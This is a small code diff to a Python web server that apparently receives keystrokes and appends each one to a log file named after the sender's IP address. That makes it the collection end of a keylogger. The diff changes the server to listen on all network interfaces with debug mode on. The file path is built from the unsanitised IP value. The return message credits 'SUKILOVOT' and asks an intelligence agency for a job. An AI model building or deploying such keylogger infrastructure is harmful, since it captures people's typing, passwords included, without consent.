@@ -16,4 +16,4 @@ def key_pressed(key, ip):
     open(f"logs/{ip}.log", "w").write(past_content + f"\n{key}")
     return {"request": "worked", "creator": "SUKILOVOT", "ABIN, me contrata": ":)"}
 
-run(app=api, debug=True, port=8080)
+run(app=api, debug=True, host="0.0.0.0", port=8080)
